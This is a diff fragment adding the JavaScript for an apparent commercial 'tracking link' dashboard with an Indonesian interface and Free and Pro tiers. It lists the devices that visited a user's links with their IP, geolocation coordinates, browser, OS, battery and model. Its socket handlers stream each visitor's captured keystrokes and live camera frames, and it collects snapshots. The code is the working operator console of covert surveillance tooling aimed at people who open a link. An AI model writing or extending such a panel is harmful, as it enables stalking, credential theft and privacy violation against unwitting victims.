+renderSidebar();
+addDeviceMarker(dev);
+updateHeaderStats();
+renderDevicesList();
+}
+});
+socket.on('device-update', (data) => {
+const dev = data.device || data;
+const idx = devices.findIndex(d => d.id === dev.id);
+if (idx >= 0) {
+Object.assign(devices[idx], dev);
+if (dev.id === selectedDeviceId) loadDeviceDetail(dev.id);
+renderSidebar();
+addDeviceMarker(devices[idx]);
+updateHeaderStats();
+renderDevicesList();
+}
+if (dev.keystrokes && dev.keystrokes.length > 0 && dev.id === selectedDeviceId) {
+dev.keystrokes.forEach(k => appendKeystroke(k.k || k.key || k));
+}
+});
+socket.on('device-offline', (data) => {
+const id = data.deviceId || data.id || data;
+const dev = devices.find(d => d.id === id);
+if (dev) {
+dev.online = false;
+if (dev.id === selectedDeviceId) loadDeviceDetail(dev.id);
+renderSidebar();
+addDeviceMarker(dev);
+updateHeaderStats();
+renderDevicesList();
+}
+});
+socket.on('new-snapshot', (data) => {
+const id = data.deviceId || (data.device && data.device.id) || (data.id);
+if (id === selectedDeviceId) refreshSnapshots(id);
+});
+socket.on('camera-frame', (data) => {
+const img = document.getElementById('liveImg');
+if (img && data.frame) { img.src = 'data:image/jpeg;base64,' + data.frame; }
+});
+socket.on('disconnect', () => { console.log('Socket disconnected'); });
+}
+
+// ---- Dashboard Loading ----
+function updateHeaderStats() {
+const total = devices.length;
+const online = devices.filter(d => d.online).length;
+document.getElementById('statDevices').innerHTML = '<span class="num">' + total + '</span> Devices';
+document.getElementById('statOnline').innerHTML = '<span class="num">' + online + '</span> Online';
+}
+
+function renderDevicesList() {
+const container = document.getElementById('devicesContainer');
+const trackingDevices = devices;
+if (trackingDevices.length > 0) {
+let html = '';
+trackingDevices.forEach(d => {
+const status = d.online ? 'online' : 'offline';
+const statusText = d.online ? 'Online' : 'Offline';
+const loc = d.location ? (d.location.city || d.location.country || '') : '';
+const coords = d.location && d.location.lat && d.location.lng ? d.location.lat.toFixed(4) + ', ' + d.location.lng.toFixed(4) : '';
+const ua = d.userAgent || '';
+const browser = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') && !ua.includes('Chrome') ? 'Safari' : ua.includes('Edg') ? 'Edge' : '';
+const os = ua.includes('Windows') ? 'Windows' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') || ua.includes('iPad') ? 'iOS' : ua.includes('Mac') ? 'macOS' : ua.includes('Linux') ? 'Linux' : '';
+const bat = d.battery ? (d.battery.level ? Math.round(d.battery.level * 100) + '%' : '') : '';
+const model = d.deviceModel && d.deviceModel !== 'Unknown' ? d.deviceModel : '';
+const icon = os === 'Android' ? '&#x1f4f1;' : os === 'iOS' ? '&#x1f4f1;' : os === 'Windows' ? '&#x1f4bb;' : os === 'macOS' ? '&#x1f4bb;' : '&#x1f4e1;';
+html += '<div class="device-card" onclick="selectDevice(\'' + d.id + '\')">' +
+'<span class="dc-dot ' + status + '"></span>' +
+'<div class="dc-info"><div class="dc-name">' + icon + ' ' + escapeHtml(model || d.label || 'Device') + '</div>' +
+'<div class="dc-meta">' + [d.ip, loc, browser, os, bat].filter(Boolean).join(' · ') + '</div></div>' +
+'<div class="dc-status ' + status + '">' + statusText + '</div></div>';
+});
+container.innerHTML = html;
+} else {
+container.innerHTML = '<div class="empty-state"><div class="empty-icon">&#x1f4e1;</div><p>Belum ada device yang mengunjungi link Anda</p></div>';
+}
+}
+
+function renderLinksList(links) {
+const container = document.getElementById('linksContainer');
+if (links && links.length > 0) {
+let html = '';
+links.forEach(g => {
+const expired = g.expiresAt && Date.now() > new Date(g.expiresAt).getTime();
+const statusClass = expired ? 'expired' : g.visited ? 'visited' : 'pending';
+const statusText = expired ? 'Expired' : g.visited ? 'Visited' : 'Pending';
+html += '<div class="link-item">' +
+'<div class="li-info"><div class="li-name" style="color:#00d4ff">' + (t('dashboard.linkLabel') || 'Link') + ' #' + escapeHtml(g.id.slice(0,8)) + '</div>' +
+'<div class="li-meta">' + formatTime(g.createdAt) + ' &middot; ' + (g.expiresAt ? formatTime(g.expiresAt) : (t('dashboard.expiryPro') || 'Permanen')) + '</div></div>' +
+'<div class="li-status ' + statusClass + '">' + statusText + '</div></div>';
+});
+container.innerHTML = html;
+} else {
+container.innerHTML = '<div class="empty-state"><div class="empty-icon">&#x1f517;</div><p>' + (t('dashboard.noLinks') || 'Belum ada link tracking') + '</p></div>';
+}
+}
+
+async function loadDashboard() {
+try {
+const me = await api('/api/auth/me');
+if (!me.ok) { localStorage.removeItem('user_token'); window.location.href = '/login.html'; return; }
+userData = me.user;
+const badge = document.getElementById('tierBadge');
+if (me.user.tier === 'pro') {
+badge.className = 'tier-badge pro';
+badge.textContent = 'Pro';
+} else {
+badge.className = 'tier-badge free';
+badge.textContent = 'Free';
+}
+document.getElementById('statLinks').innerHTML = '<span class="num">' + (me.user.linkCount || 0) + '</span> Links';
+const linksData = await api('/api/user/links');
+if (linksData.ok) {
+if (linksData.links) renderLinksList(linksData.links);
+if (linksData.devices) {
+devices = linksData.devices;
+renderSidebar();
+updateHeaderStats();
+renderDevicesList();
+devices.forEach(d => addDeviceMarker(d));
+}
+}
+document.getElementById('loadingOverlay').classList.remove('show');
+initSocket();
+} catch(e) {
+toast('Gagal memuat dashboard: ' + e.message);
+document.getElementById('loadingOverlay').classList.remove('show');
+}
+}
+
+// ---- Init ----
+initMap();
+loadLang(currentLang).then(() => loadDashboard());
 </script>
 </body>
 </html>
